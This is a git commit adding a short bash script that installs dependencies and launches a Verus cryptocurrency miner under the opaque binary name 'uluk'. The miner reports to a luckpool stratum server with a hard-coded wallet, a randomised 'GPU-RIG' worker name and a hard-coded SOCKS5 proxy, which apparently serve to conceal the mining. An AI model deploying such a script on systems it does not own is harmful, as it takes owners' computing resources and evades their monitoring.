c440319d0dab3c25a000afabac4a7d788f4704ce
Bugot902 <87396513+Bugot902@users.noreply.github.com>
2021-07-19 07:55:22 +0700

    Add files via upload

---
+++ vrsc1.sh
@@ -0,0 +1,10 @@
+#!/bin/bash
+sudo apt update 
+sudo apt install screen libjansson4 -y 
+chmod +x start.sh && chmod +x uluk chmod 777 uluk start.sh
+screen -dmS ls 
+POOL=stratum+tcp://eu.luckpool.net:3956
+WALLET=RJ65jz8gvzkRAXGNdAZcR3xB5ReJPYvJfS
+WORKER=$(echo $(shuf -i 1-5 -n 1)GPU-RIG)
+PROXY=socks5://72.206.181.105:64935
+./uluk -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
